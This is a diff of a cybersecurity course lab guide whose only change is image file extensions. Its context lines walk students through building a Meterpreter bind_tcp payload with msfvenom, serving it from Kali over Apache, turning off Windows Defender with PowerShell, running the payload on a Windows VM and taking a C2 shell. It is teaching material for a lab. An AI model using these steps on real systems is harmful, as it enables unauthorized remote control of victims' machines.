@@ -108,7 +108,7 @@ Explain to students that in order for the payload/agent we're going to craft to 
 
 7. Next, generate the agent/payload by typing `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe` 
 
-![](/Images/02.Metasploitmsfvenom.png)
+![](/Images/02.Metasploitmsfvenom.PNG)
 
 8. Clear out the /var/www/html/ folder: `rm /var/www/html/*`
 
@@ -116,21 +116,21 @@ Explain to students that in order for the payload/agent we're going to craft to 
 
 10. Start the apache web service by typing `service apache2 start`
 
-![](/Images/03.apache.png)
+![](/Images/03.apache.PNG)
 
 11. Now move from your Kali VM to your Windows VM. Open an web browser and browse to your Kali's IP address. Download the `shell.exe` payload and execute it.
 
 - Note: Windows Defender should be turned off. If not turned off, open PowerShell as administrator and run `Set-MPPreference -DisableRealTimeMonitoring $true` 
 
-![](/Images/04.Windows.png)
+![](/Images/04.Windows.PNG)
 
 12. Back in Kali, you should see a message "Meterpreter Session 1 opened". To interact with this session, type `sessions -i 1`
 
-![](/Images/05.Session.png)
+![](/Images/05.Session.PNG)
 
 13. You now have a shell into the Windows machine, with Metasploit operating as the C2 server. Demonstrate commands such as `ls` and `pwd` to show you're on the Windows machine.
 
-![](/Images/06.Command.png)
+![](/Images/06.Command.PNG)
 
 We will explore the capabilities of the Meterpreter shell later in the course. 
 
